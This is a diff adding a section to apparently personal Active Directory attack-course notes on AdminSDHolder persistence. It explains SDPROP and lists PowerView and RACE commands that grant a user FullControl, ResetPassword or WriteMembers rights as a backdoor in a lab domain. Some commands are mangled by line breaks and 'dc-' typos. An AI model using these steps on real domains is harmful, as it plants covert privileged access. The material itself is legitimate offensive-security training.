@@ -107,6 +107,41 @@ ls \\dcorp-dc\C$
 
 ---
 ### ACL - AdminSDHolder
+- Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).
+- Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of rotected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
+![[Pasted image 20231218115220.png]]
+![[Pasted image 20231218115252.png]]
+
+- With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.
+- In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
+- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-
+dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -
+Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+```
+-  Using ActiveDirectory Module and [RACE toolkit](https://github.com/samratashok/RACE) :
+```powershell
+Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 
+-Right GenericAll 
+-DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' 
+-Verbose
+```
+- Other interesting permissions (ResetPassword, WriteMembers) for a user to
+the AdminSDHolder,:
+Add-DomainObjectAcl -TargetIdentity
+'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc
+al' -PrincipalIdentity student1 -Rights ResetPassword -
+PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity
+'CN=AdminSDHolder,CN=System,dc-
+dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1
+-Rights WriteMembers -PrincipalDomain
+dollarcorp.moneycorp.local -TargetDomain
+dollarcorp.moneycorp.local -Verbose
+
 
 
 ---
